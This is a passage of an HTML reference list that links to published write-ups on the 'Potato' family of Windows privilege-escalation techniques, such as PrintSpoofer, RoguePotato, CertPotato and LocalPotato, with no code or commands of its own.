<li class="align-left"><a href="https://decoder.cloud/2019/12/06/we-thought-they-were-potatoes-but-they-were-beans/">https://decoder.cloud/2019/12/06/we-thought-they-were-potatoes-but-they-were-beans/</a></li>
</ul></li>
<li>PrintSpoofer : <a href="https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/">https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/</a></li>
<li>RoguePotato : <a href="https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/">https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/</a></li>
<li>GenericPotato : <a href="https://micahvandeusen.com/the-power-of-seimpersonation/">https://micahvandeusen.com/the-power-of-seimpersonation/</a></li>
<li>RemotePotato : <a href="https://www.sentinelone.com/labs/relaying-potatoes-another-unexpected-privilege-escalation-vulnerability-in-windows-rpc-protocol/">https://www.sentinelone.com/labs/relaying-potatoes-another-unexpected-privilege-escalation-vulnerability-in-windows-rpc-protocol/</a></li>
<li>JuicyPotatoNG :
<ul id="bkmrk-https%3A%2F%2Fdecoder.clou"><li><a href="https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/">https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/</a></li>
<li>Juicy2 : <a href="https://decoder.cloud/2020/05/30/the-impersonation-game/">https://decoder.cloud/2020/05/30/the-impersonation-game/</a></li>
<li>James Forshaw's article about authentication relay from Kerberos token : <a href="https://googleprojectzero.blogspot.com/2021/10/windows-exploitation-tricks-relaying.html">https://googleprojectzero.blogspot.com/2021/10/windows-exploitation-tricks-relaying.html</a></li>
</ul></li>
<li>CertPotato : <a href="https://sensepost.com/blog/2022/certpotato-using-adcs-to-privesc-from-virtual-and-network-service-accounts-to-local-system/">https://sensepost.com/blog/2022/certpotato-using-adcs-to-privesc-from-virtual-and-network-service-accounts-to-local-system/</a></li>
<li>LocalPotato : <a href="https://decoder.cloud/2023/02/13/localpotato-when-swapping-the-context-leads-you-to-system/">https://decoder.cloud/2023/02/13/localpotato-when-swapping-the-context-leads-you-to-system/</a></li>
<li>CoercedPotato (in french) : <a href="https://blog.hackvens.fr/articles/CoercedPotato.html">https://blog.hackvens.fr/articles/CoercedPotato.html</a></li>
</ul>
